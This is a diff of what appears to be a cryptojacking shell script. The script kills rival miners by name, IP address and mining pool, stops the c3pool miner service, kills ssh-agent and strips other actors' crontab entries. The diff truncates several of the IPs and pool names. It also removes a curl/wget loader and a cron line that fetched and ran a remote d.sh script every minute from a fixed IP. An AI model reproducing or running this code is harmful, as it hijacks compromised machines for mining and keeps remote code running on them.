@@ -93,9 +93,9 @@ ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill 
 ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '45.76.122.9' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '51.38.191.17' | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep '51.15.56.16' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
@@ -196,18 +196,18 @@ ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xar
 ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
-ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
-ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
-ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
-ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
+ps auxf | grep -v grep | grep "xmr.crypto-pool:6666" | awk '{print $2}' | xargs -I % kill -9 %
+ps auxf | grep -v grep | grep "xmr.crypto-pool:7777" | awk '{print $2}' | xargs -I % kill -9 %
+ps auxf | grep -v grep | grep "xmr.crypto-pool:443" | awk '{print $2}' | xargs -I % kill -9 %
+ps auxf | grep -v grep | grep "stratum.f2pool:8888" | awk '{print $2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
 ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
 ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
 netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
-netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
-netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
-netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
-netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep '176.31.6.1' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep '108.174.197.7' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep '192.236.161.9' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep '88.99.242.9' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
 systemctl stop c3pool_miner.service
 pkill -f pastebin
 pkill -f ssh-agent
@@ -596,13 +596,6 @@ fi
 BIN_FULL_PATH="$BIN_PATH/$BIN_NAME"
 echo "$BIN_FULL_PATH"
 
-LDR="wget -q -O -"
-if [ -s /usr/bin/curl ]; then
-  LDR="curl"
-fi
-if [ -s /usr/bin/wget ]; then
-  LDR="wget -q -O -"
-fi
 
 if [ -x "$(command -v curl)" ]; then
   WGET="curl -o"
@@ -680,14 +673,7 @@ exec $SKL
 crontab -l | sed '/#wget/d' | crontab -
 crontab -l | sed '/#curl/d' | crontab -
 crontab -l | grep -e "195.3.146.118" | grep -v grep
-if [ $? -eq 0 ]; then
-  echo "cron good"
-else
-  (
-    crontab -l 2>/dev/null
-    echo "* * * * * $LDR http://195.3.146.118/d.sh | sh > /dev/null 2>&1"
-  ) | crontab -
-fi
+
 exec $BIN_NAME;
 crontab -l | sed '/base64/d' | crontab -
 crontab -l | sed '/update.sh/d' | crontab -
